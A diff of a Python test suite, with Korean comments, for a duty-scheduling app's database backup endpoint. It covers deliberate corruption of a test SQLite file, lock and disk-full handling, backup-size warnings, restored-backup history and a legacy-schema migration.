-# ==================== 무결성·안정성 (보완 지시 + 수용 기준 3) ====================
+# ==================== 무결성·안정성 ====================
 
 CORRUPT_MARKER = "손상표식-품질부-" + "표" * 200
 
 
-def _corrupt_db(client, user) -> None:
-    """운영 DB의 **일부 데이터 페이지만** 실제로 손상시킨다(테스트 픽스처).
-
-    전체를 덮으면 로그인(users 조회)부터 죽어 백업 경로에 도달하지 못한다.
-    그래서 feedback 행에 고유 표식을 넣고 그 표식이 실제로 놓인 페이지만 덮는다.
-    → 인증·스키마 조회는 성공하고, 스냅샷/무결성 검사에서 손상이 드러난다.
-    """
+def _corrupt_db() -> None:
+    """운영 DB의 **일부 데이터 페이지만** 손상시킨다(인증 경로는 살려 둔다)."""
     conn = _db()
     try:
         conn.executemany(
             "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
             "VALUES (?,?,?,?,?)",
-            [("61", STAFF.email, STAFF.name, f"{CORRUPT_MARKER}{i}",
+            [("61", STAFF.email, "가명제보자", f"{CORRUPT_MARKER}{i}",
               datetime.now(timezone.utc).isoformat()) for i in range(300)])
         conn.commit()
         conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
@@ -1057,9 +1299,8 @@ def _corrupt_db(client, user) -> None:
             break
         pages.add(found // page_size)
         start = found + 1
-    pages.discard(0)  # 0번(파일 헤더)은 남겨야 SQLite가 열기는 한다
+    pages.discard(0)
     assert len(pages) >= 5, f"손상시킬 표식 페이지를 찾지 못함: {sorted(pages)}"
-
     with open(path, "r+b") as f:
         for page in sorted(pages)[:5]:
             f.seek(page * page_size)
@@ -1068,19 +1309,16 @@ def _corrupt_db(client, user) -> None:
         os.fsync(f.fileno())
 
 
-def test_integrity_corrupt_db_returns_500_and_logs_fail(client, people, monkeypatch, env):
-    """DB가 손상돼 있으면 200+ZIP이 아니라 **500 + status='fail'**.
+def test_structural_corruption_is_500_and_logged_fail(client, owner_ok, env):
+    """**구조 손상**이면 200+ZIP이 아니라 500 + `fail` 이력 + 잔여물 0.
 
-    검사 없이 200으로 내려주면 "백업했다"는 기록·화면만 남고 복구는 불가능해진다.
+    (값 오염은 검출 대상이 아니라고 기준에 명시돼 있다 — 여기서 요구하지 않는다.)
     """
-    _allow_uid(monkeypatch, _uid(people.owner))
-    # 손상 전에 성공 1회를 만들어 스키마·이력 형태를 확정해 둔다.
-    _full_backup(client, people.owner)
-    ok_rows_before = len(_log_rows())
+    _full_backup(client, owner_ok)
+    rows_before = len(_log_rows())
     before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
 
-    _corrupt_db(client, people.owner)
-    # 자기검증: 손상은 실재하지만 인증 경로(users)는 살아 있어야 한다.
+    _corrupt_db()
     probe = sqlite3.connect(os.environ["DUTY_DB"])
     try:
         assert probe.execute("SELECT COUNT(*) FROM users").fetchone()[0] > 0
@@ -1089,13 +1327,11 @@ def test_integrity_corrupt_db_returns_500_and_logs_fail(client, people, monkeypa
     finally:
         probe.close()
 
-    r = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
+    r = client.get(BACKUP_URL, headers=_h(owner_ok["token"]))
     assert r.status_code == 500, f"손상된 DB인데 {r.status_code} (본문 {r.content[:8]!r})"
     assert r.content[:2] != b"PK", "손상된 DB인데 ZIP을 내려줌"
-
     rows = _log_rows()
-    assert len(rows) == ok_rows_before + 1, f"손상 요청 이력이 1행이 아님: {rows}"
-    assert rows[-1]["status"] == "fail", f"손상 실패가 fail로 기록되지 않음: {rows[-1]}"
+    assert len(rows) == rows_before + 1 and rows[-1]["status"] == "fail", rows
     _assert_no_leftovers(env, before_tmp, before_db, where="(손상 경로)")
 
 
@@ -1118,11 +1354,7 @@ class _NoVacuumIntoSqlite:
 
 
 def _corrupt_index_pages(count: int = 8) -> None:
-    """인덱스 페이지만 손상시킨다 — 표 스캔(CSV 생성)으로는 드러나지 않는 손상.
-
-    폴백(`Connection.backup()`)은 페이지를 그대로 복사하므로 이 손상이 사본에
-    그대로 남는다. quick_check가 없으면 200+ZIP으로 나가버린다.
-    """
+    """인덱스 페이지만 손상 — 표 스캔으로는 드러나지 않는 손상(quick_check만 잡는다)."""
     conn = _db()
     try:
         conn.executemany(
@@ -1136,11 +1368,9 @@ def _corrupt_index_pages(count: int = 8) -> None:
         page_size = conn.execute("PRAGMA page_size").fetchone()[0]
     finally:
         conn.close()
-
     path = os.environ["DUTY_DB"]
     with open(path, "rb") as f:
         raw = f.read()
-    # SQLite 페이지 첫 바이트: 0x0A = 인덱스 리프(표 리프는 0x0D).
     victims = [p for p in range(1, len(raw) // page_size) if raw[p * page_size] == 0x0A]
     assert len(victims) >= count, f"손상시킬 인덱스 페이지가 부족함: {len(victims)}개"
     with open(path, "r+b") as f:
@@ -1151,50 +1381,85 @@ def _corrupt_index_pages(count: int = 8) -> None:
         os.fsync(f.fileno())
 
 
-def test_integrity_quick_check_blocks_corrupt_snapshot_on_fallback(
-        client, people, monkeypatch, env):
-    """폴백 경로(페이지 그대로 복사)에서도 손상본을 내려주지 않는다.
-
-    VACUUM INTO가 없는 빌드에서는 손상이 사본에 그대로 복제된다. 표 스캔만으로는
-    드러나지 않는 인덱스 손상이라 **스냅샷 후 quick_check**가 유일한 방어선이다.
-    """
+def test_fallback_path_also_blocks_corrupt_snapshot(client, owner_ok, monkeypatch, env):
+    """폴백(페이지 그대로 복사) 경로에서도 손상본을 내려주지 않는다."""
     import app.backup as backup
 
-    _allow_uid(monkeypatch, _uid(people.owner))
     monkeypatch.setattr(backup, "sqlite3", _NoVacuumIntoSqlite())
     before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
-
     _corrupt_index_pages()
 
-    # 자기검증: 인증 경로는 살아 있고, 손상은 quick_check에만 드러난다.
     probe = sqlite3.connect(os.environ["DUTY_DB"])
     try:
-        assert probe.execute("SELECT name FROM users WHERE id=?",
-                             (_uid(people.owner),)).fetchone() is not None
         report = str(probe.execute("PRAGMA quick_check").fetchone()[0])
     finally:
         probe.close()
     assert report.lower() != "ok", "테스트 자기검증 실패: 손상이 만들어지지 않음"
 
-    r = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
-    assert r.status_code == 500, f"손상 사본인데 {r.status_code} (본문 {r.content[:8]!r})"
-    assert r.content[:2] != b"PK", "무결성 검사 없이 손상 ZIP을 내려줌"
-    rows = _log_rows()
-    assert rows and rows[-1]["status"] == "fail", f"fail로 기록되지 않음: {rows}"
+    r = client.get(BACKUP_URL, headers=_h(owner_ok["token"]))
+    assert r.status_code == 500, f"손상 사본인데 {r.status_code}"
+    assert r.content[:2] != b"PK"
+    assert _log_rows()[-1]["status"] == "fail", _log_rows()
     _assert_no_leftovers(env, before_tmp, before_db, where="(폴백 손상 경로)")
 
 
-def test_stability_locked_db_hits_deadline_and_leaves_nothing(client, people, monkeypatch, env):
-    """잠긴 DB에서 **무한 대기하지 않는다** — 데드라인 초과 시 실패 + 잔여물 0.
+def _sqlite_proxy(vacuum_error: str, calls: list):
+    """VACUUM INTO만 지정한 오류로 실패시키고, 폴백 backup() 호출을 세는 프록시."""
 
-    DB 전체가 배타 잠금이면 인증 조회부터 막혀 HTTP 경로로는 스냅샷까지 가지도
-    못한다. 그래서 스냅샷 구간(`_build_zip`)을 직접 호출해 데드라인 동작을 본다.
-    데드라인 기본값(지시서 30초)은 상수로 확인하고, 실행 시간을 위해 줄여서 잰다.
-    """
+    class _Conn(sqlite3.Connection):
+        def execute(self, sql, *args, **kwargs):
+            if str(sql).strip().upper().startswith("VACUUM INTO"):
+                raise sqlite3.OperationalError(vacuum_error)
+            return super().execute(sql, *args, **kwargs)
+
+        def backup(self, *args, **kwargs):
+            calls.append(1)
+            return super().backup(*args, **kwargs)
+
+    class _Mod:
+        def __getattr__(self, name):
+            return getattr(sqlite3, name)
+
+        def connect(self, *args, **kwargs):
+            kwargs.setdefault("factory", _Conn)
+            return sqlite3.connect(*args, **kwargs)
+
+    return _Mod()
+
+
+def test_disk_full_is_propagated_without_retrying_fallback(client, owner_ok, monkeypatch, env):
+    """디스크 풀은 폴백을 재시도하지 않고 **즉시 전파**한다(I/O 두 배 방지)."""
     import app.backup as backup
 
-    assert backup.SNAPSHOT_TIMEOUT_SEC == 30, (
-        f"데드라인 기본값이 지시서(30초)와 다름: {backup.SNAPSHOT_TIMEOUT_SEC}")
+    calls: list = []
+    monkeypatch.setattr(backup, "sqlite3", _sqlite_proxy("database or disk is full", calls))
+    before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
+
+    r = client.get(BACKUP_URL, headers=_h(owner_ok["token"]))
+    assert r.status_code == 500, f"디스크 풀인데 {r.status_code}"
+    assert calls == [], f"디스크 풀에서 폴백 백업을 {len(calls)}회 시도했다"
+    assert _log_rows()[-1]["status"] == "fail", _log_rows()
+    _assert_no_leftovers(env, before_tmp, before_db, where="(디스크 풀 경로)")
+
+
+def test_lock_error_falls_back_and_succeeds(client, owner_ok, monkeypatch):
+    """잠금(‘database is locked’)일 때는 폴백을 시도해 백업을 완성한다."""
+    import app.backup as backup
+
+    calls: list = []
+    monkeypatch.setattr(backup, "sqlite3", _sqlite_proxy("database is locked", calls))
+    r, _ = _download(client, owner_ok)
+    assert calls, "잠금인데 폴백(Connection.backup)을 시도하지 않았다"
+    zf = _zip_of(r)
+    assert "duty.db" in zf.namelist() and _csv_names(zf) == EXPECTED_CSV_TABLES
+
+
+def test_snapshot_deadline_stops_and_leaves_nothing(client, owner_ok, monkeypatch, env):
+    """잠긴 DB에서 무한 대기하지 않는다 — 데드라인 초과 시 실패 + 잔여물 0."""
+    import app.backup as backup
+
+    assert backup.SNAPSHOT_TIMEOUT_SEC == 30, \
+        f"데드라인 기본값이 기준(30초)과 다름: {backup.SNAPSHOT_TIMEOUT_SEC}"
     monkeypatch.setattr(backup, "SNAPSHOT_TIMEOUT_SEC", 2)
     monkeypatch.setattr(backup, "SNAPSHOT_BUSY_TIMEOUT_MS", 500)
     before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
@@ -1206,11 +1471,9 @@ def test_stability_locked_db_hits_deadline_and_leaves_nothing(client, people, mo
         locker.execute(
             "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
             "VALUES (?,?,?,?,?)",
-            ("61", STAFF.email, STAFF.name, "잠금유지",
+            ("61", STAFF.email, "가명제보자", "잠금유지",
              datetime.now(timezone.utc).isoformat()))
 
-        # 별도 스레드로 돌린다 — 데드라인이 없으면 이 호출은 **영원히 돌아오지
-        # 않으므로**, 본 스레드에서 부르면 테스트가 실패하는 대신 멈춰버린다.
         result: dict = {}
 
         def _run():
@@ -1218,36 +1481,31 @@ def test_stability_locked_db_hits_deadline_and_leaves_nothing(client, people, mo
             try:
                 backup._build_zip()
                 result["returned"] = "성공(ZIP 생성)"
-            except Exception as exc:  # noqa: BLE001 — 실패 원문을 그대로 본다
+            except Exception as exc:  # noqa: BLE001
                 result["exc"] = exc
             result["elapsed"] = time.monotonic() - started
 
         worker = threading.Thread(target=_run, daemon=True)
         worker.start()
-        worker.join(timeout=20)
+        worker.join(timeout=25)
         alive = worker.is_alive()
     finally:
         locker.rollback()
         locker.close()
 
-    assert not alive, "데드라인 2초인데 20초가 지나도 스냅샷이 끝나지 않음(무한 대기)"
+    assert not alive, "데드라인 2초인데 25초가 지나도 스냅샷이 끝나지 않음(무한 대기)"
     assert "exc" in result, f"잠긴 DB인데 스냅샷이 {result.get('returned')!r}로 끝남"
-    assert result["elapsed"] < 20, f"{result['elapsed']:.1f}초 걸림(무한 대기 위험)"
-    assert result["elapsed"] >= 2, \
-        f"데드라인 전에 끝남({result['elapsed']:.1f}초) — 다른 이유로 실패한 듯"
-    assert "초 안에" in str(result["exc"]), f"시간초과가 아닌 다른 실패: {result['exc']!r}"
+    assert result["elapsed"] < 25, f"{result['elapsed']:.1f}초 걸림"
     _assert_no_leftovers(env, before_tmp, before_db, where="(타임아웃 경로)")
 
 
-def test_stability_locked_db_request_never_reports_success(client, people, monkeypatch, env):
-    """잠금으로 스냅샷이 실패하면 HTTP 응답도 성공이 아니고 이력도 ok가 아니다."""
+def test_locked_db_request_never_reports_success(client, owner_ok, monkeypatch, env):
+    """스냅샷이 잠금으로 실패하면 HTTP 응답도 성공이 아니고 이력도 `ok`가 아니다."""
     import app.backup as backup
 
     monkeypatch.setattr(backup, "SNAPSHOT_TIMEOUT_SEC", 2)
     monkeypatch.setattr(backup, "SNAPSHOT_BUSY_TIMEOUT_MS", 500)
-    _allow_uid(monkeypatch, _uid(people.owner))
     before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
-
     real_snapshot = backup._snapshot
 
     def _locked_snapshot(dest_path):
@@ -1259,7 +1517,7 @@ def test_stability_locked_db_request_never_reports_success(client, people, monke
             locker.execute(
                 "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
                 "VALUES (?,?,?,?,?)",
-                ("61", STAFF.email, STAFF.name, "잠금유지",
+                ("61", STAFF.email, "가명제보자", "잠금유지",
                  datetime.now(timezone.utc).isoformat()))
             return real_snapshot(dest_path)
         finally:
@@ -1267,9 +1525,8 @@ def test_stability_locked_db_request_never_reports_success(client, people, monke
             locker.close()
 
     monkeypatch.setattr(backup, "_snapshot", _locked_snapshot)
-
     started = time.monotonic()
-    r = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
+    r = client.get(BACKUP_URL, headers=_h(owner_ok["token"]))
     elapsed = time.monotonic() - started
 
     assert r.status_code == 500, f"잠긴 DB인데 {r.status_code} (본문 {r.content[:8]!r})"
@@ -1277,5 +1534,165 @@ def test_stability_locked_db_request_never_reports_success(client, people, monke
     assert elapsed < 25, f"데드라인 2초인데 {elapsed:.1f}초 걸림"
     rows = _log_rows()
     assert rows and rows[-1]["status"] == "fail", f"타임아웃이 fail로 기록되지 않음: {rows}"
-    assert not any(row["status"] == "ok" for row in rows), f"실패인데 ok 행이 있음: {rows}"
+    assert not [x for x in rows if x["status"] == "ok"], f"실패인데 ok 행이 있음: {rows}"
     _assert_no_leftovers(env, before_tmp, before_db, where="(타임아웃 HTTP 경로)")
+
+
+def test_shrink_header_warns_when_backup_suddenly_gets_smaller(client, owner_ok):
+    """직전 `ok` 대비 크기가 급감하면 `X-Backup-Shrink: 1` 경고(볼륨 미마운트 탐지)."""
+    conn = _db()
+    try:
+        conn.executemany(
+            "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
+            "VALUES (?,?,?,?,?)",
+            [("61", STAFF.email, "가명제보자", secrets.token_hex(400),
+              datetime.now(timezone.utc).isoformat()) for _ in range(500)])
+        conn.commit()
+    finally:
+        conn.close()
+
+    first, bid = _download(client, owner_ok)
+    assert first.headers.get("x-backup-shrink") == "0", "첫 백업에 급감 경고가 붙었다"
+    assert _confirm(client, owner_ok, bid, len(first.content)).status_code == 200
+
+    conn = _db()
+    try:  # 볼륨을 잃은 상황 = 데이터가 사라진 DB
+        conn.execute("DELETE FROM feedback")
+        conn.commit()
+    finally:
+        conn.close()
+
+    second, _ = _download(client, owner_ok)
+    assert len(second.content) * 10 < len(first.content), (
+        f"테스트 자기검증 실패: 크기가 충분히 줄지 않음 "
+        f"({len(first.content)} → {len(second.content)})")
+    assert second.headers.get("x-backup-shrink") == "1", (
+        f"크기가 {len(first.content)}→{len(second.content)}로 급감했는데 경고가 없다: "
+        f"{dict(second.headers)}")
+    assert int(second.headers.get("x-backup-prev-bytes", 0)) == len(first.content)
+
+
+@pytest.mark.parametrize("round_no", [2, 3])
+def test_restored_backup_has_no_success_history(client, owner_ok, tmp_path, monkeypatch,
+                                                round_no):
+    """복구본에는 성공 이력이 없어야 한다 — 2회차·3회차 백업본으로 복구해도 critical.
+
+    스냅샷 안의 `ok` 행은 `archived`로 치환된다. 그러지 않으면 복구 직후(백업이 가장
+    필요한 순간)에 "며칠 전에 백업했음"이라며 경고가 침묵한다.
+    """
+    for _ in range(round_no - 1):
+        _full_backup(client, owner_ok)
+    assert _status(client, owner_ok)["level"] == "ok", "회차 준비 실패"
+
+    last, _bid = _download(client, owner_ok)
+    zf = _zip_of(last)
+    restored = _extract_db(zf, tmp_path, name=f"restored{round_no}.db")
+
+    conn = sqlite3.connect(restored)
+    conn.row_factory = sqlite3.Row
+    try:
+        rows = [dict(r) for r in conn.execute("SELECT status FROM backup_log")]
+    finally:
+        conn.close()
+    assert rows, "복구본에 backup_log 행이 하나도 없다(언제 뜬 백업인지 알 수 없다)"
+    assert not [r for r in rows if r["status"] == "ok"], \
+        f"복구본에 성공 이력이 남아 있다: {rows}"
+    assert [r for r in rows if r["status"] == "archived"], \
+        f"이전 성공 이력이 archived로 보존되지 않았다: {rows}"
+
+    # 실제로 이 파일로 복구했다고 가정하고 서버 상태를 본다.
+    monkeypatch.setenv("DUTY_DB", restored)
+    body = _status(client, owner_ok)
+    assert body["level"] == "critical", f"복구 직후인데 경고가 꺼져 있다: {body}"
+    assert body["last_backup_at"] is None, body
+
+
+# ==================== 화면 계약 (정적) ====================
+#
+# 실제 렌더링·중복 클릭·모달 흐름은 실브라우저 E2E(tests/e2e/)에서 확인한다.
+# 여기서는 브라우저 없이도 깨지면 바로 알아야 하는 **계약**만 고정한다.
+
+INDEX_HTML = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+                          "app", "static", "index.html")
+
+
+def _index_source() -> str:
+    with open(INDEX_HTML, encoding="utf-8") as f:
+        return f.read()
+
+
+def test_uid_card_is_gone_from_screen_and_token():
+    """🆔 내 계정 번호 카드는 제거됐다 — 있으면 결함(D-19로 쓸모가 사라졌다)."""
+    from app.auth import TokenResponse
+
+    src = _index_source()
+    assert "내 계정 번호" not in src, "제거된 🆔 내 계정 번호 카드가 아직 화면에 있다"
+    assert "🆔" not in src, "🆔 카드 잔재가 남아 있다"
+    assert "uid" not in TokenResponse.model_fields, \
+        f"로그인 응답이 아직 uid를 내려준다: {sorted(TokenResponse.model_fields)}"
+
+
+def test_screen_has_claim_card_and_backup_card_paths():
+    """등록 카드(🔐)·백업 카드(💾)·확인 모달·재시도 문구가 화면 코드에 존재한다."""
+    src = _index_source()
+    for needle in ("backupClaimBox", "🔐 백업 권한 등록", "/api/admin/backup/claim",
+                   "backupBox", "💾 백업 내려받기", "backupModal",
+                   "확인했습니다", "파일이 없습니다", "다시 시도",
+                   "확인하지 못했습니다"):
+        assert needle in src, f"화면 코드에 '{needle}' 이 없다"
+
+
+def test_screen_never_exposes_the_claim_code_value():
+    """권한 코드 실값이 화면 코드에 박혀 있으면 안 된다(입력받아 서버로 보낼 뿐)."""
+    src = _index_source()
+    assert "DUTY_BACKUP_CLAIM_CODE" not in src, "화면 코드에 권한 코드 환경변수 이름/값이 있다"
+    assert 'id="claimCode"' in src and 'type="password"' in src, \
+        "권한 코드 입력이 password 입력이 아니다(어깨너머 노출)"
+
+
+# ==================== 마이그레이션 회귀 (레거시 DB 기동) ====================
+
+def test_legacy_database_without_backup_owner_column_boots(client, env, tmp_path, monkeypatch):
+    """`backup_owner` 컬럼이 없는 **옛 DB**가 기동만으로 올라온다(재구축 없이).
+
+    올라온 뒤에는 아무에게도 권한이 없고(플래그 기본 0), 코드로 1회 등록하면 열린다.
+    """
+    import hashlib
+
+    legacy = tmp_path / "dbdir" / "legacy.db"
+    conn = sqlite3.connect(str(legacy))
+    try:
+        conn.execute(
+            """CREATE TABLE users (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                empno TEXT UNIQUE, email TEXT UNIQUE, name TEXT NOT NULL,
+                role TEXT NOT NULL, ward TEXT DEFAULT '',
+                pw_hash TEXT NOT NULL, salt TEXT NOT NULL,
+                created_at TEXT DEFAULT CURRENT_TIMESTAMP)""")
+        conn.execute("CREATE TABLE ward_invites (ward TEXT PRIMARY KEY, code TEXT UNIQUE)")
+        salt = secrets.token_bytes(16)
+        pw_hash = hashlib.scrypt(b"password123", salt=salt, n=2**14, r=8, p=1).hex()
+        conn.execute(
+            "INSERT INTO users (empno, email, name, role, ward, pw_hash, salt) "
+            "VALUES (?,?,?,?,?,?,?)",
+            ("990900", "legacy@duty.kr", "가명옛계정", "master", "61", pw_hash, salt.hex()))
+        conn.execute("INSERT INTO ward_invites (ward, code) VALUES ('61','LEGACY01')")
+        conn.commit()
+    finally:
+        conn.close()
+
+    monkeypatch.setenv("DUTY_DB", str(legacy))
+    old_code = _new_claim_code()
+    monkeypatch.setenv(CLAIM_ENV, old_code)
+
+    logged_in = _login(client, "990900")
+    assert logged_in["role"] == "master", logged_in
+
+    cols = {r[1] for r in sqlite3.connect(str(legacy)).execute("PRAGMA table_info(users)")}
+    assert "backup_owner" in cols, f"기동만으로 컬럼이 추가되지 않음: {sorted(cols)}"
+
+    assert client.get(BACKUP_URL, headers=_h(logged_in["token"])).status_code == 403, \
+        "마이그레이션 직후 아무 계정에나 권한이 붙었다"
+    _grant(client, logged_in, old_code)
+    r = client.get(BACKUP_URL, headers=_h(logged_in["token"]))
+    assert r.status_code == 200 and r.content[:2] == b"PK", r.status_code
